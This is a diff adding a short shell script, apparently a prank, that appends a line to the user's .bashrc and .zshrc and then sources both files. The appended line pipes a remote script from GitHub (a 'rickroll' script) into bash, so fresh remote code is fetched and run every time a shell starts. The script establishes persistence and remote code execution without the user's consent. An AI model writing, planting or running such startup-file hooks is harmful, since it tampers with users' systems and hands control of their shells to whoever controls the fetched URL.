@@ -1,0 +1,5 @@
+#! /bin/sh 
+echo "curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash" >> .bashrc
+echo "curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash" >> .zshrc
+source .bashrc
+source .zshrc
